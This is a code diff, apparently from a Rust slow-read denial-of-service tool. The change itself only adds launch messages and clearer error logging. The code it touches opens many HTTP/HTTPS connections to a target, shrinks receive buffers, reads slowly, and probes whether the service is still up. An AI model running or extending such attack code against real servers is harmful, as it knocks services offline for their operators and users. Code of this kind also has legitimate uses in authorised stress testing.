@@ -100,8 +100,10 @@ fn start(options: Options) -> impl Future<Item = (), Error = ()> {
     let start_time = Instant::now();
     let service_online = Arc::new(AtomicBool::new(true));
 
+    println!("Launching probe connection...");
     let probe_conn = launch_probe_connection(request.clone(), &options, service_online.clone());
 
+    println!("Launching slow connections...");
     let interval = 
         Interval::new(start_time, Duration::from_secs(1))
         .for_each(move |instant| {
@@ -120,7 +122,7 @@ fn start(options: Options) -> impl Future<Item = (), Error = ()> {
         });
 
     Deadline::new(interval, Instant::now() + attack_duration)
-        .map_err(|_| ())
+        .map_err(|e| debug!("Deadline Error: {:?}", e))
         .join(probe_conn)
         .and_then(|_| ok(()))
 }
@@ -140,13 +142,13 @@ fn launch_probe_connection(req: Arc<Request>, options: &Options, service_online:
 
         let probe = TcpStream::connect(req.sock_addr())
             .map_err(move |e| {
-                debug!("Connecting probe {:?}", e);
+                debug!("Error connecting probe {:?}", e);
             }).and_then(move |tcp_stream| {
                 if *req_clone.scheme() == Scheme::HTTPS {
                     let builder = SslConnector::builder(SslMethod::tls()).unwrap();
 
                     Box::new(SslConnectorExt::connect_async(&SslConnectorBuilder::build(builder), req_clone.host(), tcp_stream)
-                             .map_err(move |e| debug!("Upgrading probe to SSL {:?}", e))
+                             .map_err(move |e| debug!("Error upgrading probe to SSL {:?}", e))
                              .and_then(move |tcp_stream| {
                                  ok(Box::new(tcp_stream) as Box<AsyncStream + Send>)
                              })) as Box<Future<Item = Box<AsyncStream + Send>, Error = ()> + Send>
@@ -156,10 +158,10 @@ fn launch_probe_connection(req: Arc<Request>, options: &Options, service_online:
 
             }).and_then(move |tcp_stream| {
                 io::write_all(tcp_stream, req_clone2.root_request_str().to_string())
-                    .map_err(|e| debug!("Writing to probe {:?}", e))
+                    .map_err(|e| debug!("Error writing to probe {:?}", e))
             }).and_then(move |(tcp_stream, _)| {
                 io::read_to_end(tcp_stream, Vec::new())
-                    .map_err(|e| debug!("Reading from probe {:?}", e))
+                    .map_err(|e| debug!("Error reading from probe {:?}", e))
             }).and_then(move |_| {
                 service_online_clone2.store(true, Ordering::SeqCst);
                 ok(Loop::Continue(()))
@@ -223,7 +225,7 @@ fn launch_attack(
     TcpStream::connect(req.sock_addr())
         .map_err(move |e| {
             err_open_conns.fetch_sub(1, Ordering::SeqCst);
-            debug!("Connecting {:?}", e);
+            debug!("Error connecting {:?}", e);
         }).and_then(move |tcp_stream| {
 
         tcp_stream.set_recv_buffer_size(recv_buffer_size).unwrap();
@@ -234,7 +236,7 @@ fn launch_attack(
             Box::new(SslConnectorExt::connect_async(&SslConnectorBuilder::build(builder), req.host(), tcp_stream)
                 .map_err(move |e| {
                     err_open_conns_2.fetch_sub(1, Ordering::SeqCst);
-                    debug!("Upgrading to SSL {:?}", e);
+                    debug!("Error upgrading to SSL {:?}", e);
                 }).and_then(move |tcp_stream| {
                     ok(Box::new(tcp_stream) as Box<AsyncStream + Send>)
                 })) as Box<Future<Item = Box<AsyncStream + Send>, Error = ()> + Send>
@@ -244,7 +246,7 @@ fn launch_attack(
 
     }).and_then(move |tcp_stream| {
         io::write_all(tcp_stream, req_clone.request_str().to_string())
-            .map_err(|e| debug!("Writing {:?}", e))
+            .map_err(|e| debug!("Error writing {:?}", e))
 
     }).and_then(move |(tcp_stream, _)| {
         loop_fn(tcp_stream, move |tcp_stream| {
@@ -254,12 +256,15 @@ fn launch_attack(
             io::read_exact(tcp_stream, buf)
                 .then(move |res| {
                     let (wait_time, value) = match res {
-                        Err(_) => (Duration::from_secs(0), ok(Loop::Break(()))),
+                        Err(e) => {
+                            debug!("Error reading {:?}", e);
+                            (Duration::from_secs(0), ok(Loop::Break(())))
+                        },
                         Ok((tcp_stream, _buf)) => (wait_time, ok(Loop::Continue(tcp_stream)))
                         };
 
                     Delay::new(Instant::now() + wait_time)
-                        .map_err(|e| debug!("Waiting {:?}", e))
+                        .map_err(|e| debug!("Error waiting {:?}", e))
                         .and_then(|_| value)
                 })
         })
